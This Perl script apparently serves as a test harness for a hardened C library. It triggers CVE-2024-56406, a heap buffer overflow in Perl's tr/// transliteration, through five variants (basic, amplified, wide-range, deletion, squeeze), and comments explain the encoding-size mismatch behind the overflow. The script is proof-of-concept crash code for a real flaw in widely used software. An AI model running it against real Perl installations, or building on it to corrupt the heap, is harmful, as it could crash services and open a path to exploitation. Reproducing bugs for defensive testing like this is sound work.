#!/usr/bin/env perl
# CVE-2024-56406: Perl tr/// transliteration heap buffer overflow
#
# This script triggers the heap buffer overflow in Perl's tr///
# operator when processing strings with wide Unicode characters.
#
# The bug: When a string contains characters above U+00FF and a
# tr/// operation maps byte-range characters (\x80-\xFF), the
# internal buffer size is calculated based on the original string's
# byte length. However, the transliteration can change the UTF-8
# encoding of characters (e.g., multi-byte -> single-byte), and
# the output may require a different buffer size than allocated.
# The mismatch causes a write past the end of the heap buffer.
#
# With stock glibc: heap metadata corruption -> SIGSEGV or SIGABRT
# With glibc_rust:  canary detects the overflow, ClampSize healing
#                   prevents the corruption from propagating

use strict;
use warnings;
use utf8;

print "[trigger.pl] CVE-2024-56406 Perl tr/// heap overflow trigger\n";

# ===================================================================
# Phase 1: Basic trigger - the minimal reproduction case
# ===================================================================
print "[trigger.pl] Phase 1: Basic trigger (1000 repetitions)...\n";
{
    # Create a string with wide characters (forces UTF-8 internal storage)
    # \x{100} is LATIN CAPITAL LETTER A WITH MACRON (2-byte UTF-8)
    my $s = "abc\x{100}" x 1000;

    # This tr/// maps byte values \x80-\xFF to 'X'.
    # The bug: buffer size is computed before the encoding change,
    # but the actual write uses the post-change encoding sizes.
    my $count = ($s =~ tr/\x80-\xff/X/);

    print "[trigger.pl]   Transliterated $count characters\n";
    print "[trigger.pl]   String length: " . length($s) . "\n";
    print "[trigger.pl]   Phase 1 survived\n";
}

# ===================================================================
# Phase 2: Amplified trigger - larger buffer, more overflow
# ===================================================================
print "[trigger.pl] Phase 2: Amplified trigger (5000 repetitions)...\n";
{
    # More repetitions = larger heap allocation = more overflow bytes
    my $s = "abcdef\x{100}\x{1FF}" x 5000;

    # tr with range that spans the encoding boundary
    my $count = ($s =~ tr/\x80-\xff/Y/);

    print "[trigger.pl]   Transliterated $count characters\n";
    print "[trigger.pl]   String length: " . length($s) . "\n";
    print "[trigger.pl]   Phase 2 survived\n";
}

# ===================================================================
# Phase 3: Wide-range trigger - multiple wide character ranges
# ===================================================================
print "[trigger.pl] Phase 3: Wide-range trigger...\n";
{
    # Mix of characters at different UTF-8 encoding widths:
    # U+0041 (A)    = 1 byte  in UTF-8
    # U+00C0 (A`)   = 2 bytes in UTF-8
    # U+0100 (A-)   = 2 bytes in UTF-8
    # U+0400 (cyrillic) = 2 bytes in UTF-8
    my $s = "";
    for my $i (0 .. 2999) {
        $s .= chr(0x41);          # ASCII 'A'
        $s .= chr(0xC0 + ($i % 64));  # \xC0-\xFF range (Latin-1 supplement)
        $s .= chr(0x100 + ($i % 256)); # Wide chars
        $s .= chr(0x400 + ($i % 64));  # Cyrillic
    }

    # This tr changes encoding for some characters, causing buffer mismatch
    my $count = ($s =~ tr/\x80-\xff/Z/);

    print "[trigger.pl]   Transliterated $count characters\n";
    print "[trigger.pl]   String length: " . length($s) . "\n";
    print "[trigger.pl]   Phase 3 survived\n";
}

# ===================================================================
# Phase 4: Deletion variant - tr///d with encoding change
# ===================================================================
print "[trigger.pl] Phase 4: Deletion variant (tr///d)...\n";
{
    my $s = ("\x{100}\x{80}\x{41}" x 3000);

    # Deletion changes the string length, compounding the buffer issue
    my $count = ($s =~ tr/\x80-\xff//d);

    print "[trigger.pl]   Deleted $count characters\n";
    print "[trigger.pl]   String length: " . length($s) . "\n";
    print "[trigger.pl]   Phase 4 survived\n";
}

# ===================================================================
# Phase 5: Squeeze variant - tr///s with encoding change
# ===================================================================
print "[trigger.pl] Phase 5: Squeeze variant (tr///s)...\n";
{
    my $s = ("\x{100}\x{FF}\x{FE}\x{FD}" x 4000);

    # Squeeze collapses repeated replacement chars, different length calc
    my $count = ($s =~ tr/\x80-\xff/W/s);

    print "[trigger.pl]   Squeezed to $count replacements\n";
    print "[trigger.pl]   String length: " . length($s) . "\n";
    print "[trigger.pl]   Phase 5 survived\n";
}

print "[trigger.pl] All phases completed without crash\n";
exit 0;
